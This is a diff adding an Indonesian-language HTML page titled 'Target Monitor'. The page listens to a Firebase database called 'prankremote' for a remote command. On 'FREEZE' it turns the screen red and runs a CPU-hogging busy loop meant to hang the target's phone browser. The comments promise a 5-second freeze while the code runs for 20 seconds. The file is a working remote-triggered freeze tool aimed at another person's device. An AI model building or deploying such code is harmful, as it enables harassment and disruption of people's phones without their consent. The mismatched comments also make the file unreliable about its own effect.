@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Target Monitor</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #0ff; 
+            font-family: monospace; 
+            text-align: center; 
+            padding-top: 100px; 
+        }
+        h1 { font-size: 24px; }
+    </style>
+</head>
+<body>
+    <h1>STATUS: MENUNGGU PERINTAH...</h1>
+    <p id="log">Sistem siap.</p>
+
+    <!-- Script Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        // Gunakan URL database Firebase yang sama
+        const firebaseConfig = {
+            databaseURL: "https://prankremote-fda79-default-rtdb.firebaseio.com/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Pantau perubahan data "perintah" di Firebase secara real-time
+        db.ref('perintah').on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.aksi) {
+                let aksi = data.aksi;
+                document.getElementById("log").innerText = "Perintah diterima: " + aksi;
+
+                if (aksi === "FREEZE") {
+                    document.body.style.background = "#ff0000"; // Layar jadi merah tanda bahaya
+                    document.querySelector("h1").innerText = "⚠️ HP SEDANG DI-FREEZE! ⚠️";
+                    
+                    // Jalankan fungsi freeze terkontrol selama 5 detik
+                    bikinFreezeKeras();
+                } else if (aksi === "NORMAL") {
+                    document.body.style.background = "#000";
+                    document.querySelector("h1").innerText = "STATUS: AMAN / NORMAL";
+                }
+            }
+        });
+
+        // Fungsi bikin CPU kerja keras (Freeze sesaat)
+        function bikinFreezeKeras() {
+            let waktuMulai = Date.now();
+            // Mutar proses berat selama 5 detik penuh agar layar macet/lag
+            while (Date.now() - waktuMulai < 20000) {
+                Math.sqrt(Math.random() * 999999999);
+            }
+            // Setelah 5 detik, balikin status ke normal otomatis
+            document.body.style.background = "#000";
+            document.querySelector("h1").innerText = "STATUS: SELESAI FREEZE";
+        }
+    </script>
+</body>
+</html>
